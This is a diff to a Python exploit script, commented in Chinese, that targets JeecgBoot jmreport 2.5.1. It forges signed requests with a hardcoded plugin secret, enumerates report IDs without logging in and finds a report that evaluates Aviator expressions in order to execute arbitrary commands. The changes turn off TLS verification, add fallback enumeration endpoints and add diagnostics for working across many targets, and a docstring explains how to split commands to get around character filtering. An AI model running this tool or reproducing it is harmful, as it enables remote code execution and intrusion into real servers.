@@ -14,7 +14,12 @@
   不允许 ; | & + = % 和单引号 ';多段命令请拆成多条依次执行
   例: id | grep root  → 分两次: "id"  + 单独再跑一次
 """
-import json, sys, time, uuid, hashlib, urllib.request, urllib.error, re
+import json, sys, time, uuid, hashlib, ssl, urllib.request, urllib.error, re
+
+# 自动忽略 SSL 证书验证(自签/无效证书目标用;仅限授权测试)
+_SSL_CTX = ssl.create_default_context()
+_SSL_CTX.check_hostname = False
+_SSL_CTX.verify_mode = ssl.CERT_NONE
 
 PLUGIN_SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121"
 ENDPOINT = "/jmreport/auto/export/python/plugin"
@@ -53,7 +58,7 @@ class Target:
             headers={"Content-Type": "application/json", "X-Sign": sign,
                      "X-TIMESTAMP": str(int(time.time() * 1000))}, method="POST")
         try:
-            r = urllib.request.urlopen(req, timeout=30)
+            r = urllib.request.urlopen(req, timeout=30, context=_SSL_CTX)
             return r.status, r.read().decode("utf-8", "replace")
         except urllib.error.HTTPError as e:
             return e.code, e.read().decode("utf-8", "replace")
@@ -62,27 +67,52 @@ class Target:
     def get(self, path):
         try:
             req = urllib.request.Request(self.base + path, headers={"User-Agent": "Mozilla/5.0"})
-            r = urllib.request.urlopen(req, timeout=15)
+            r = urllib.request.urlopen(req, timeout=15, context=_SSL_CTX)
             return r.status, r.read().decode("utf-8", "replace")
         except urllib.error.HTTPError as e:
             return e.code, e.read().decode("utf-8", "replace")
 
-def enum_reports(t):
-    s, b = t.get("/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=8")
-    if s != 200: return []
-    try:
-        recs = (json.loads(b).get("result") or {}).get("records") or []
-        return [r.get("id") for r in recs if r.get("id")]
-    except Exception:
-        return []
+def classify(b):
+    """按探测响应判断目标/报表状态,便于跨目标诊断"""
+    if "Function not found" in b:
+        return "✅ 可用(触发 Aviator)"
+    if "签名" in b and ("失败" in b or "不存在" in b):
+        return "❌ 签名不符(版本差异或密钥不同 / 非 2.5.1)"
+    if "导出报表失败" in b or "SQL" in b:
+        return "⚠️ 进入导出但未触发求值(可能无SQL数据集/已修复版本)"
+    if "Token" in b or "登录" in b:
+        return "❌ 该入口需登录(版本/配置差异)"
+    if "Not Found" in b or "404" in b:
+        return "❌ 接口不存在(非 jmreport 或已删该入口)"
+    return "⚠️ 其它: " + b[:80]
 
-def find_working_report(t, ids):
-    """逐报表探测: 参数 '=no_such_fn_xyz()' 触发 'Function not found' 即该报表会执行 Aviator"""
+def find_working_report(t, ids, verbose=True):
+    """逐报表探测,带诊断输出"""
     for rid in ids:
         s, b = t.post_plugin(rid, "no_such_fn_xyz()")
+        tag = classify(b)
+        if verbose:
+            print("  - 探测 %s: %s" % (rid, tag))
         if "Function not found" in b:
             return rid
     return None
+
+def enum_reports(t):
+    """匿名枚举报表 id:主用 excelQueryByTemplate;为空时回退到其它匿名列表接口"""
+    for path in ("/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=100",
+                 "/jmreport/excelQuery?reportType=&name=&pageNo=1&pageSize=100",
+                 "/jmreport/query/report/folder/template?name=&pageNo=1&pageSize=100"):
+        s, b = t.get(path)
+        if s != 200:
+            continue
+        try:
+            recs = (json.loads(b).get("result") or {}).get("records") or []
+            ids = [r.get("id") for r in recs if r.get("id")]
+            if ids:
+                return ids
+        except Exception:
+            continue
+    return []
 
 def exploit(t, report_id, cmd):
     out_file = "jmout_%s.png" % uuid.uuid4().hex[:8]
@@ -121,11 +151,17 @@ def main():
     print("[*] 枚举报表...")
     ids = enum_reports(t)
     if not ids:
-        print("[-] 枚举失败,请确认目标可达且为 JeecgBoot+jmreport"); return
-    print("[*] 候选报表: %s" % ", ".join(ids[:5]))
+        print("[-] 枚举失败(0 个报表):确认目标可达、确为 JeecgBoot+jmreport 2.5.1,\n    或目标已删除全部演示报表(可手动提供报表 id)")
+        return
+    print("[*] 候选报表(%d): %s" % (len(ids), ", ".join(ids[:6])))
     rid = find_working_report(t, ids)
     if not rid:
-        print("[-] 未找到会执行 Aviator 参数的报表(尝试前 8 个)。可手动指定: 脚本内改 report_id"); return
+        print("[-] 候选报表均未触发 Aviator 求值。可能原因:")
+        print("    ① 目标 jmreport 非 2.5.1 或已被修复(=参数不再进表达式引擎)")
+        print("    ② 目标报表全部为 API/静态数据集(无 SQL 数据集报表,不触发求值)")
+        print("    ③ 该入口被网关拦截/需登录(版本或配置差异)")
+        print("    可手动指定: 改脚本 main 里 ids 为已知可用报表 id 重试")
+        return
     print("[+] 可用报表: %s" % rid)
     print("[*] 执行: %s" % cmd)
     exploit(t, rid, cmd)
